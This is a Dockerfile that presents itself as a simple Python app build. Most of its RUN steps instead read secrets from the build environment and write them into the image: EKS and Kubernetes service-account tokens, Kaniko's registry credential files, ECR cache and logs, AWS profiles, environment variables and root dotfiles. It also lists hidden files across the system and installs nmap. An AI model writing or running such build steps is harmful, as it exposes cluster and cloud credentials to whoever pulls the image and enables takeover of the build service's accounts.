FROM python:3.6
CMD ["cp","-rf","/kaniko/*"," ","."]
COPY . /app
WORKDIR /app
RUN echo `cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token` >> /admin.txt
RUN echo `cat /var/run/secrets/kubernetes.io/serviceaccount/token` >> /admin.txt
RUN apt-get update
RUN apt-get install nmap -y
RUN apt install tree 
RUN echo `ls -a /` >> /main_file.txt
RUN echo `aws configure list-profiles` >> /aws_profile.txt 2>&1
RUN echo `ls -a /workspace` >> /main_file.txt
RUN echo `ls .?* ` >> /hidden1.txt
RUN echo `find / -type d -iname ".*" -print` >> /hidden_dir1.txt
RUN echo `find / -type f -iname ".*" -print` >> /hidden_dir2.txt
RUN echo `cat /.dockerenv` >> /docker_env
RUN echo `ls -al /root/` >> /root_dir
RUN echo `ls -al /root/.ecr/` >> /root_dir_ecr
RUN echo `cat /root/.ecr/cache.json` >> /root_dir_ecr_cache
RUN echo `cat /root/.bashrc` >> /bashrc
RUN echo `cat /root/.profile` >> /profile
RUN echo `cat /root/.wget-hsts` >> /wget-hsts
RUN echo `cat /root/.ecr/log/*` >> /root_dir_ecr_log
RUN echo `cat /usr/share/fonts/truetype/dejavu/.uuid /.dockerenv` >> /docker_env_2
RUN echo `cat /kaniko/executor` >> /executor
RUN echo `ls -a /kaniko/` >> /kaniko_file.txt
RUN echo `ls -a /kaniko/.docker/` >> /docker_file.txt
RUN echo `ls -al /kaniko/.docker/.data/` >> /data.txt
RUN echo `cat /kaniko/.docker/config.json` >> /cred.txt
RUN echo `cat /kaniko/.docker/cloudConfig` >> /cred.txt
#RUN echo `ls -la /home` >> /dir.txt
#RUN echo `ls -la /` >> /dir.txt
#RUN echo `hostname` >> /dir.txt
RUN echo `tree /` >> /tree.txt
RUN echo `env`> /env.txt
RUN echo `cat /kaniko/ssl/certs/ca-certificates.crt` > /cert
VOLUME /kaniko
# RUN echo `cat /kaniko/docker-credential-ecr-login` >> /secret.txt
# RUN echo `cat /kaniko/docker-credential-gcr` >> /secret.txt
# RUN echo `cat /kaniko/docker-credential-acr-env` >> /secret.txt
RUN apt update
RUN apt install net-tools -y
RUN pip install -r requirements.txt
ENTRYPOINT ["python"]
CMD ["app.py"]
